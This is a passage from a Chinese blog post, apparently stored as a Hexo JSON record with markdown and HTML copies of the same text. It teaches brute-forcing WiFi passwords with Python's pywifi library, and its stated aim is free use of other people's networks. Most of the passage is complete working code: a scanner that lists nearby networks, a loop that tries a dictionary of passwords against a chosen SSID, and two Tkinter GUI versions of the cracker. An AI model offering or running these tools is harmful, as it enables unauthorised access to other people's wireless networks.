调用扫描模块，返回一个排序后的wifi列表\n            wifi_list = wifi_scan()\n            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理\n            choose_exit_flag = 0\n            while not choose_exit_flag:\n                try:\n                    target_num = int(input('请选择你要尝试破解的wifi：'))\n                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入\n                    if target_num in range(len(wifi_list)):\n                        # 二次确认\n                        while not choose_exit_flag:\n                            try:\n                                choose = str(input(f'你选择要破解的WiFi名称是：{wifi_list[target_num][1]}，确定吗？（Y/N）'))\n                                # 对用户输入进行小写处理，并判断\n                                if choose.lower() == 'y':\n                                    choose_exit_flag = 1\n                                elif choose.lower() == 'n':\n                                    break\n                                # 处理用户其它字母输入\n                                else:\n                                    print('只能输入 Y/N 哦o(*￣︶￣*)o')\n                            # 处理用户非字母输入\n                            except ValueError:\n                                print('只能输入 Y/N 哦o(*￣︶￣*)o')\n                        # 退出破解\n                        if choose_exit_flag == 1:\n                            break\n                        else:\n                            print('请重新输入哦(*^▽^*)')\n                except ValueError:\n                    print('只能输入数字哦o(*￣︶￣*)o')\n            # 密码破解，传入用户选择的wifi名称\n            wifi_password_crack(wifi_list[target_num][1])\n            print('-' * 38)\n            exit_flag = 1\n        except Exception as e:\n            print(e)\n            raise e\n\n\nif __name__ == '__main__':\n    main()\n```\n\n脚本运行效果如下：  \n![](./2024/07/14/Python破解Wifi密码教程来了/2.png)\n\n上述代码实现了依据信号强度枚举当前附近的所有 WIFI 名称，并且可供用户自主选择需要暴力破解的 WIFI，同时还可灵活指定暴力破解的字典，相对而言体验感提升了不少。进一步也可以将上述脚本打包生成 exe 文件，双击运行效果如下：\n\n![](./2024/07/14/Python破解Wifi密码教程来了/3.png)\n\n### 图形化界面\n\n下面基于 Python 的 GUI 图形界面开发库 Tkinter 优化上述脚本，实现友好的可视化 WIFI 暴力破解界面工具。\n\n关于 Tkinter 库的语法可参见：\n\nhttps://www.runoob.com/python/python-gui-tkinter.html\n\n**简单版UI**\n---------\n\n```\nfrom tkinter import *\nfrom pywifi import const\nimport pywifi\nimport time\n\n\n# 主要步骤：\n# 1、获取第一个无线网卡\n# 2、断开所有的wifi\n# 3、读取密码本\n# 4、设置睡眠时间\ndef wificonnect(str, wifiname):\n    # 窗口无线对象\n    wifi = pywifi.PyWiFi()\n    # 抓取第一个无线网卡\n    ifaces = wifi.interfaces()[0]\n    # 断开所有的wifi\n    ifaces.disconnect()\n    time.sleep(1)\n    if ifaces.status() == const.IFACE_DISCONNECTED:\n        # 创建wifi连接文件\n        profile = pywifi.Profile()\n        profile.ssid = wifiname\n        # wifi的加密算法\n        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n        # wifi的密码\n        profile.key = str\n        # 网卡的开发\n        profile.auth = const.AUTH_ALG_OPEN\n        # 加密单元,这里需要写点加密单元否则无法连接\n        profile.cipher = const.CIPHER_TYPE_CCMP\n        # 删除所有的wifi文件\n        ifaces.remove_all_network_profiles()\n        # 设置新的连接文件\n        tep_profile = ifaces.add_network_profile(profile)\n        # 连接\n        ifaces.connect(tep_profile)\n        time.sleep(3)\n        if ifaces.status() == const.IFACE_CONNECTED:\n            return True\n        else:\n            return False\n\n\ndef readPwd():\n    # 获取wiif名称\n    wifiname = entry.get().strip()\n    path = r'./pwd.txt'\n    file = open(path, 'r')\n    while True:\n        try:\n            # 读取\n            mystr = file.readline().strip()\n            # 测试连接\n            bool = wificonnect(mystr, wifiname)\n            if bool:\n                text.insert(END, '密码正确' + mystr)\n                text.see(END)\n                text.update()\n                file.close()\n                break\n            else:\n                text.insert(END, '密码错误' + mystr)\n                text.see(END)\n                text.update()\n        except:\n            continue\n\n\n# 创建窗口\nroot = Tk()\nroot.title('wifi破解')\nroot.geometry('500x400')\n# 标签\nlabel = Label(root, text='输入要破解的WIFI名称：')\n# 定位\nlabel.grid()\n# 输入控件\nentry = Entry(root, font=('微软雅黑', 14))\nentry.grid(row=0, column=1)\n# 列表控件\ntext = Listbox(root, font=('微软雅黑', 14), width=40, height=10)\ntext.grid(row=1, columnspan=2)\n# 按钮\nbutton = Button(root, text='开始破解', width=20, height=2, command=readPwd)\nbutton.grid(row=2, columnspan=2)\n# 显示窗口\nroot.mainloop()\n```\n\n脚本运行效果：  \n![](./2024/07/14/Python破解Wifi密码教程来了/4.png)\n\n**UI升级版**\n---------\n\n以上图形界面未允许选择密码字典，下面进行优化升级：\n\n```\n\nfrom tkinter import *\nfrom tkinter import ttk\nimport pywifi\nfrom pywifi import const\nimport time\nimport tkinter.filedialog  # 在Gui中打开文件浏览\nimport tkinter.messagebox  # 打开tkiner的消息提醒框\n\n\nclass MY_GUI():\n    def __init__(self, init_window_name):\n        self.init_window_name = init_window_name\n        # 密码文件路径\n        self.get_value = StringVar()  # 设置可变内容\n        # 获取破解wifi账号\n        self.get_wifi_value = StringVar()\n        # 获取wifi密码\n        self.get_wifimm_value = StringVar()\n        # 抓取网卡接口\n        self.wifi = pywifi.PyWiFi()\n        # 抓取第一个无线网卡\n        self.iface = self.wifi.interfaces()[0]\n        # 测试链接断开所有链接\n        self.iface.disconnect()\n        time.sleep(1)  # 休眠1秒\n        # 测试网卡是否属于断开状态\n        assert self.iface.status() in \\\n               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]\n\n    def __str__(self):\n        # 自动会调用的函数，返回自身的网卡\n        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())\n\n    # 设置窗口\n    def set_init_window(self):\n        self.init_window_name.title(\"WIFI破解工具\")\n        self.init_window_name.geometry('+500+200')\n        labelframe = LabelFrame(width=400, height=200, text=\"配置\")  # 框架，以下对象都是对于labelframe中添加的\n        labelframe.grid(column=0, row=0, padx=10, pady=10)\n        self.search = Button(labelframe, text=\"搜索附近WiFi\", command=self.scans_wifi_list).grid(column=0, row=0)\n        self.pojie = Button(labelframe, text=\"开始破解\", command=self.readPassWord).grid(column=1, row=0)\n        self.label = Label(labelframe, text=\"目录路径：\").grid(column=0, row=1)\n        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)\n        self.file = Button(labelframe, text=\"添加密码文件目录\", command=self.add_mm_file).grid(column=2, row=1)\n        self.wifi_text = Label(labelframe, text=\"WiFi账号：\").grid(column=0, row=2)\n        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)\n        self.wifi_mm_text = Label(labelframe, text=\"WiFi密码：\").grid(column=2, row=2)\n        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W)\n        self.wifi_labelframe = LabelFrame(text=\"wifi列表\")\n        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)\n        # 定义树形结构与滚动条\n        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=\"headings\", columns=(\"a\", \"b\", \"c\", \"d\"))\n        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)\n        self.wifi_tree.configure(yscrollcommand=self.vbar.set)\n        # 表格的标题\n        self.wifi_tree.column(\"a\", width=50, anchor=\"center\")\n        self.wifi_tree.column(\"b\", width=100, anchor=\"center\")\n        self.wifi_tree.column(\"c\", width=100, anchor=\"center\")\n        self.wifi_tree.column(\"d\", width=100, anchor=\"center\")\n        self.wifi_tree.heading(\"a\", text=\"WiFiID\")\n        self.wifi_tree.heading(\"b\", text=\"SSID\")\n        self.wifi_tree.heading(\"c\", text=\"BSSID\")\n        self.wifi_tree.heading(\"d\", text=\"signal\")\n        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)\n        self.wifi_tree.bind(\"<Double-1>\", self.onDBClick)\n        self.vbar.grid(row=4, column=1, sticky=NS)\n\n    # 搜索wifi\n    def scans_wifi_list(self):  # 扫描周围wifi列表\n        # 开始扫描\n        print(\"^_^ 开始扫描附近wifi...\")\n        self.iface.scan()\n        time.sleep(15)\n        # 在若干秒后获取扫描结果\n        scanres = self.iface.scan_results()\n        # 统计附近被发现的热点数量\n        nums = len(scanres)\n        print(\"数量: %s\" % (nums))\n        # 实际数据\n        self.show_scans_wifi_list(scanres)\n        return scanres\n\n    # 显示wifi列表\n    def show_scans_wifi_list(self, scans_res):\n        for index, wifi_info in enumerate(scans_res):\n            self.wifi_tree.insert(\"\", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))\n\n    # 添加密码文件目录\n    def add_mm_file(self):\n        self.filename = tkinter.filedialog.askopenfilename()\n        self.get_value.set(self.filename)\n\n    # Treeview绑定事件\n    def onDBClick(self, event):\n        self.sels = event.widget.selection()\n        self.get_wifi_value.set(self.wifi_tree.item(self.sels, \"values\")[1])\n\n    # 读取密码字典，进行匹配\n    def readPassWord(self):\n        self.getFilePath = self.get_value.get()\n        self.get_wifissid = self.get_wifi_value.get()\n        pwdfilehander = open(self.getFilePath, \"r\", errors=\"ignore\")\n        while True:\n            try:\n                self.pwdStr = pwdfilehander.readline()\n                if not self.pwdStr:\n                    break\n                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)\n                if self.bool1:\n                    self.res = \"[*] 密码正确！wifi名：%s，匹配密码：%s \" % (self.get_wifissid, self.pwdStr)\n                    self.get_wifimm_value.set(self.pwdStr)\n                    tkinter.messagebox.showinfo('提示', '破解成功！！！')\n                    print(self.res)\n                    break\n                else:\n                    self.res = \"[*] 密码错误！wifi名:%s，匹配密码：%s\" % (self.get_wifissid, self.pwdStr)\n                    print(self.res)\n                time.sleep(3)\n            except:\n                continue\n\n    # 对wifi和密码进行匹配\n    def connect(self, pwd_Str, wifi_ssid):\n        # 创建wifi链接文件\n        self.profile = pywifi.Profile()\n        self.profile.ssid = wifi_ssid  # wifi名称\n        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放\n        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法\n        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元\n        self.profile.key = pwd_Str  # 密码\n        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件\n        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件\n        self.iface.connect(self.tmp_profile)  # 链接\n        time.sleep(5)\n        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上\n            isOK = True\n        else:\n            isOK = False\n        self.iface.disconnect()  # 断开\n        time.sleep(1)\n        # 检查断开状态\n        assert self.iface.status() in \\\n               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]\n        return isOK\n\n\ndef gui_start():\n    init_window = Tk()\n    ui = MY_GUI(init_window)\n    print(ui)\n    ui.set_init_window()\n    init_window.mainloop()\n\n\nif __name__ == \"__main__\":\n    gui_start()\n```\n\n脚本运行效果如下：\n\n![](./2024/07/14/Python破解Wifi密码教程来了/5.png)\n\n以上基于 Python 的 GUI 图形界面开发库 Tkinter，实际上 Python 的 GUI 编程可以借助 PyQt5 来自动生成 UI 代码。\n\n\n\n### 总结\n\n本文学习了 Python 暴力破解 WIFI 密码的方法、以及 Python GUI 图形化编程的基础使用。所演示的代码的不足在于均没有使用多线程进行 WIFI 连接测试，实际上因为 WIFI 连接测试需要一定的耗时（3-5秒），故使用多线程将能减少暴力破解过程的等待时间。\n\n\n","slug":"Python破解Wifi密码教程来了","published":1,"updated":"2024-07-14T10:44:58.740Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ry0000ebsuhgfpc51yj","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>本文将记录学习下如何通过 Python 脚本实现 WIFI 密码的暴力破解，从而实现免费蹭网。</p>\n<h3 id=\"无图形界面\"><a href=\"#无图形界面\" class=\"headerlink\" title=\"无图形界面\"></a>无图形界面</h3><p>先来看看没有图形界面版的爆破脚本。</p>\n<h2 id=\"WIFI爆破\"><a href=\"#WIFI爆破\" class=\"headerlink\" title=\"WIFI爆破\"></a><strong>WIFI爆破</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\">import time</span><br><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 测试连接，返回链接结果</span><br><span class=\"line\">def wifiConnect(pwd):</span><br><span class=\"line\">    # 抓取网卡接口</span><br><span class=\"line\">    wifi = pywifi.PyWiFi()</span><br><span class=\"line\">    # 获取第一个无线网卡</span><br><span class=\"line\">    ifaces = wifi.interfaces()[0]</span><br><span class=\"line\">    # 断开所有连接</span><br><span class=\"line\">    ifaces.disconnect()</span><br><span class=\"line\">    time.sleep(1)</span><br><span class=\"line\">    wifistatus = ifaces.status()</span><br><span class=\"line\">    if wifistatus == const.IFACE_DISCONNECTED:</span><br><span class=\"line\">        # 创建WiFi连接文件</span><br><span class=\"line\">        profile = pywifi.Profile()</span><br><span class=\"line\">        # 要连接WiFi的名称</span><br><span class=\"line\">        profile.ssid = &quot;Tr0e&quot;</span><br><span class=\"line\">        # 网卡的开放状态</span><br><span class=\"line\">        profile.auth = const.AUTH_ALG_OPEN</span><br><span class=\"line\">        # wifi加密算法,一般wifi加密算法为wps</span><br><span class=\"line\">        profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class=\"line\">        # 加密单元</span><br><span class=\"line\">        profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class=\"line\">        # 调用密码</span><br><span class=\"line\">        profile.key = pwd</span><br><span class=\"line\">        # 删除所有连接过的wifi文件</span><br><span class=\"line\">        ifaces.remove_all_network_profiles()</span><br><span class=\"line\">        # 设定新的连接文件</span><br><span class=\"line\">        tep_profile = ifaces.add_network_profile(profile)</span><br><span class=\"line\">        ifaces.connect(tep_profile)</span><br><span class=\"line\">        # wifi连接时间</span><br><span class=\"line\">        time.sleep(2)</span><br><span class=\"line\">        if ifaces.status() == const.IFACE_CONNECTED:</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return False</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;已有wifi连接&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 读取密码本</span><br><span class=\"line\">def readPassword():</span><br><span class=\"line\">    success = False</span><br><span class=\"line\">    print(&quot;****************** WIFI破解 ******************&quot;)</span><br><span class=\"line\">    # 密码本路径</span><br><span class=\"line\">    path = &quot;pwd.txt&quot;</span><br><span class=\"line\">    # 打开文件</span><br><span class=\"line\">    file = open(path, &quot;r&quot;)</span><br><span class=\"line\">    start = datetime.datetime.now()</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            pwd = file.readline()</span><br><span class=\"line\">            # 去除密码的末尾换行符</span><br><span class=\"line\">            pwd = pwd.strip(&#x27;\\n&#x27;)</span><br><span class=\"line\">            bool = wifiConnect(pwd)</span><br><span class=\"line\">            if bool:</span><br><span class=\"line\">                print(&quot;[*] 密码已破解：&quot;, pwd)</span><br><span class=\"line\">                print(&quot;[*] WiFi已自动连接！！！&quot;)</span><br><span class=\"line\">                success = True</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                # 跳出当前循环，进行下一次循环</span><br><span class=\"line\">                print(&quot;正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s&quot;%(&quot;Tr0e&quot;,pwd))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            continue</span><br><span class=\"line\">    end = datetime.datetime.now()</span><br><span class=\"line\">    if(success):</span><br><span class=\"line\">        print(&quot;[*] 本次破解WIFI密码一共用了多长时间：&#123;&#125;&quot;.format(end - start))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！&quot;)</span><br><span class=\"line\">    exit(0)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__==&quot;__main__&quot;:</span><br><span class=\"line\">    readPassword()</span><br></pre></td></tr></table></figure>\n\n<p>代码运行效果：<br><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/1.png\"></p>\n<h2 id=\"脚本优化\"><a href=\"#脚本优化\" class=\"headerlink\" title=\"脚本优化\"></a><strong>脚本优化</strong></h2><p>以上脚本需内嵌 WIFI 名、爆破字典路径，缺少灵活性。下面进行改造优化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">import time</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># WiFi扫描模块</span><br><span class=\"line\">def wifi_scan():</span><br><span class=\"line\">    # 初始化wifi</span><br><span class=\"line\">    wifi = pywifi.PyWiFi()</span><br><span class=\"line\">    # 使用第一个无线网卡</span><br><span class=\"line\">    interface = wifi.interfaces()[0]</span><br><span class=\"line\">    # 开始扫描</span><br><span class=\"line\">    interface.scan()</span><br><span class=\"line\">    for i in range(4):</span><br><span class=\"line\">        time.sleep(1)</span><br><span class=\"line\">        print(&#x27;\\r扫描可用 WiFi 中，请稍后。。。（&#x27; + str(3 - i), end=&#x27;）&#x27;)</span><br><span class=\"line\">    print(&#x27;\\r扫描完成！\\n&#x27; + &#x27;-&#x27; * 38)</span><br><span class=\"line\">    print(&#x27;\\r&#123;:4&#125;&#123;:6&#125;&#123;&#125;&#x27;.format(&#x27;编号&#x27;, &#x27;信号强度&#x27;, &#x27;wifi名&#x27;))</span><br><span class=\"line\">    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象</span><br><span class=\"line\">    bss = interface.scan_results()</span><br><span class=\"line\">    # 存放wifi名的集合</span><br><span class=\"line\">    wifi_name_set = set()</span><br><span class=\"line\">    for w in bss:</span><br><span class=\"line\">        # 解决乱码问题</span><br><span class=\"line\">        wifi_name_and_signal = (100 + w.signal, w.ssid.encode(&#x27;raw_unicode_escape&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class=\"line\">        wifi_name_set.add(wifi_name_and_signal)</span><br><span class=\"line\">    # 存入列表并按信号排序</span><br><span class=\"line\">    wifi_name_list = list(wifi_name_set)</span><br><span class=\"line\">    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)</span><br><span class=\"line\">    num = 0</span><br><span class=\"line\">    # 格式化输出</span><br><span class=\"line\">    while num &lt; len(wifi_name_list):</span><br><span class=\"line\">        print(&#x27;\\r&#123;:&lt;6d&#125;&#123;:&lt;8d&#125;&#123;&#125;&#x27;.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))</span><br><span class=\"line\">        num += 1</span><br><span class=\"line\">    print(&#x27;-&#x27; * 38)</span><br><span class=\"line\">    # 返回wifi列表</span><br><span class=\"line\">    return wifi_name_list</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># WIFI破解模块</span><br><span class=\"line\">def wifi_password_crack(wifi_name):</span><br><span class=\"line\">    # 字典路径</span><br><span class=\"line\">    wifi_dic_path = input(&quot;请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：&quot;)</span><br><span class=\"line\">    with open(wifi_dic_path, &#x27;r&#x27;) as f:</span><br><span class=\"line\">        # 遍历密码</span><br><span class=\"line\">        for pwd in f:</span><br><span class=\"line\">            # 去除密码的末尾换行符</span><br><span class=\"line\">            pwd = pwd.strip(&#x27;\\n&#x27;)</span><br><span class=\"line\">            # 创建wifi对象</span><br><span class=\"line\">            wifi = pywifi.PyWiFi()</span><br><span class=\"line\">            # 创建网卡对象，为第一个wifi网卡</span><br><span class=\"line\">            interface = wifi.interfaces()[0]</span><br><span class=\"line\">            # 断开所有wifi连接</span><br><span class=\"line\">            interface.disconnect()</span><br><span class=\"line\">            # 等待其断开</span><br><span class=\"line\">            while interface.status() == 4:</span><br><span class=\"line\">                # 当其处于连接状态时，利用循环等待其断开</span><br><span class=\"line\">                pass</span><br><span class=\"line\">            # 创建连接文件（对象）</span><br><span class=\"line\">            profile = pywifi.Profile()</span><br><span class=\"line\">            # wifi名称</span><br><span class=\"line\">            profile.ssid = wifi_name</span><br><span class=\"line\">            # 需要认证</span><br><span class=\"line\">            profile.auth = const.AUTH_ALG_OPEN</span><br><span class=\"line\">            # wifi默认加密算法</span><br><span class=\"line\">            profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class=\"line\">            profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class=\"line\">            # wifi密码</span><br><span class=\"line\">            profile.key = pwd</span><br><span class=\"line\">            # 删除所有wifi连接文件</span><br><span class=\"line\">            interface.remove_all_network_profiles()</span><br><span class=\"line\">            # 设置新的wifi连接文件</span><br><span class=\"line\">            tmp_profile = interface.add_network_profile(profile)</span><br><span class=\"line\">            # 开始尝试连接</span><br><span class=\"line\">            interface.connect(tmp_profile)</span><br><span class=\"line\">            start_time = time.time()</span><br><span class=\"line\">            while time.time() - start_time &lt; 1.5:</span><br><span class=\"line\">                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）</span><br><span class=\"line\">                if interface.status() == 4:</span><br><span class=\"line\">                    print(f&#x27;\\r连接成功！密码为：&#123;pwd&#125;&#x27;)</span><br><span class=\"line\">                    exit(0)</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    print(f&#x27;\\r正在利用密码 &#123;pwd&#125; 尝试破解。&#x27;, end=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 主函数</span><br><span class=\"line\">def main():</span><br><span class=\"line\">    # 退出标致</span><br><span class=\"line\">    exit_flag = 0</span><br><span class=\"line\">    # 目标编号</span><br><span class=\"line\">    target_num = -1</span><br><span class=\"line\">    while not exit_flag:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            print(&#x27;WiFi万能钥匙&#x27;.center(35, &#x27;-&#x27;))</span><br><span class=\"line\">            # 调用扫描模块，返回一个排序后的wifi列表</span><br><span class=\"line\">            wifi_list = wifi_scan()</span><br><span class=\"line\">            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理</span><br><span class=\"line\">            choose_exit_flag = 0</span><br><span class=\"line\">            while not choose_exit_flag:</span><br><span class=\"line\">                try:</span><br><span class=\"line\">                    target_num = int(input(&#x27;请选择你要尝试破解的wifi：&#x27;))</span><br><span class=\"line\">                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入</span><br><span class=\"line\">                    if target_num in range(len(wifi_list)):</span><br><span class=\"line\">                        # 二次确认</span><br><span class=\"line\">                        while not choose_exit_flag:</span><br><span class=\"line\">                            try:</span><br><span class=\"line\">                                choose = str(input(f&#x27;你选择要破解的WiFi名称是：&#123;wifi_list[target_num][1]&#125;，确定吗？（Y/N）&#x27;))</span><br><span class=\"line\">                                # 对用户输入进行小写处理，并判断</span><br><span class=\"line\">                                if choose.lower() == &#x27;y&#x27;:</span><br><span class=\"line\">                                    choose_exit_flag = 1</span><br><span class=\"line\">                                elif choose.lower() == &#x27;n&#x27;:</span><br><span class=\"line\">                                    break</span><br><span class=\"line\">                                # 处理用户其它字母输入</span><br><span class=\"line\">                                else:</span><br><span class=\"line\">                                    print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)</span><br><span class=\"line\">                            # 处理用户非字母输入</span><br><span class=\"line\">                            except ValueError:</span><br><span class=\"line\">                                print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)</span><br><span class=\"line\">                        # 退出破解</span><br><span class=\"line\">                        if choose_exit_flag == 1:</span><br><span class=\"line\">                            break</span><br><span class=\"line\">                        else:</span><br><span class=\"line\">                            print(&#x27;请重新输入哦(*^▽^*)&#x27;)</span><br><span class=\"line\">                except ValueError:</span><br><span class=\"line\">                    print(&#x27;只能输入数字哦o(*￣︶￣*)o&#x27;)</span><br><span class=\"line\">            # 密码破解，传入用户选择的wifi名称</span><br><span class=\"line\">            wifi_password_crack(wifi_list[target_num][1])</span><br><span class=\"line\">            print(&#x27;-&#x27; * 38)</span><br><span class=\"line\">            exit_flag = 1</span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\">            print(e)</span><br><span class=\"line\">            raise e</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>脚本运行效果如下：<br><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/2.png\"></p>\n<p>上述代码实现了依据信号强度枚举当前附近的所有 WIFI 名称，并且可供用户自主选择需要暴力破解的 WIFI，同时还可灵活指定暴力破解的字典，相对而言体验感提升了不少。进一步也可以将上述脚本打包生成 exe 文件，双击运行效果如下：</p>\n<p><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/3.png\"></p>\n<h3 id=\"图形化界面\"><a href=\"#图形化界面\" class=\"headerlink\" title=\"图形化界面\"></a>图形化界面</h3><p>下面基于 Python 的 GUI 图形界面开发库 Tkinter 优化上述脚本，实现友好的可视化 WIFI 暴力破解界面工具。</p>\n<p>关于 Tkinter 库的语法可参见：</p>\n<p><a href=\"https://www.runoob.com/python/python-gui-tkinter.html\">https://www.runoob.com/python/python-gui-tkinter.html</a></p>\n<h2 id=\"简单版UI\"><a href=\"#简单版UI\" class=\"headerlink\" title=\"简单版UI\"></a><strong>简单版UI</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from tkinter import *</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 主要步骤：</span><br><span class=\"line\"># 1、获取第一个无线网卡</span><br><span class=\"line\"># 2、断开所有的wifi</span><br><span class=\"line\"># 3、读取密码本</span><br><span class=\"line\"># 4、设置睡眠时间</span><br><span class=\"line\">def wificonnect(str, wifiname):</span><br><span class=\"line\">    # 窗口无线对象</span><br><span class=\"line\">    wifi = pywifi.PyWiFi()</span><br><span class=\"line\">    # 抓取第一个无线网卡</span><br><span class=\"line\">    ifaces = wifi.interfaces()[0]</span><br><span class=\"line\">    # 断开所有的wifi</span><br><span class=\"line\">    ifaces.disconnect()</span><br><span class=\"line\">    time.sleep(1)</span><br><span class=\"line\">    if ifaces.status() == const.IFACE_DISCONNECTED:</span><br><span class=\"line\">        # 创建wifi连接文件</span><br><span class=\"line\">        profile = pywifi.Profile()</span><br><span class=\"line\">        profile.ssid = wifiname</span><br><span class=\"line\">        # wifi的加密算法</span><br><span class=\"line\">        profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class=\"line\">        # wifi的密码</span><br><span class=\"line\">        profile.key = str</span><br><span class=\"line\">        # 网卡的开发</span><br><span class=\"line\">        profile.auth = const.AUTH_ALG_OPEN</span><br><span class=\"line\">        # 加密单元,这里需要写点加密单元否则无法连接</span><br><span class=\"line\">        profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class=\"line\">        # 删除所有的wifi文件</span><br><span class=\"line\">        ifaces.remove_all_network_profiles()</span><br><span class=\"line\">        # 设置新的连接文件</span><br><span class=\"line\">        tep_profile = ifaces.add_network_profile(profile)</span><br><span class=\"line\">        # 连接</span><br><span class=\"line\">        ifaces.connect(tep_profile)</span><br><span class=\"line\">        time.sleep(3)</span><br><span class=\"line\">        if ifaces.status() == const.IFACE_CONNECTED:</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return False</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def readPwd():</span><br><span class=\"line\">    # 获取wiif名称</span><br><span class=\"line\">    wifiname = entry.get().strip()</span><br><span class=\"line\">    path = r&#x27;./pwd.txt&#x27;</span><br><span class=\"line\">    file = open(path, &#x27;r&#x27;)</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            # 读取</span><br><span class=\"line\">            mystr = file.readline().strip()</span><br><span class=\"line\">            # 测试连接</span><br><span class=\"line\">            bool = wificonnect(mystr, wifiname)</span><br><span class=\"line\">            if bool:</span><br><span class=\"line\">                text.insert(END, &#x27;密码正确&#x27; + mystr)</span><br><span class=\"line\">                text.see(END)</span><br><span class=\"line\">                text.update()</span><br><span class=\"line\">                file.close()</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                text.insert(END, &#x27;密码错误&#x27; + mystr)</span><br><span class=\"line\">                text.see(END)</span><br><span class=\"line\">                text.update()</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            continue</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 创建窗口</span><br><span class=\"line\">root = Tk()</span><br><span class=\"line\">root.title(&#x27;wifi破解&#x27;)</span><br><span class=\"line\">root.geometry(&#x27;500x400&#x27;)</span><br><span class=\"line\"># 标签</span><br><span class=\"line\">label = Label(root, text=&#x27;输入要破解的WIFI名称：&#x27;)</span><br><span class=\"line\"># 定位</span><br><span class=\"line\">label.grid()</span><br><span class=\"line\"># 输入控件</span><br><span class=\"line\">entry = Entry(root, font=(&#x27;微软雅黑&#x27;, 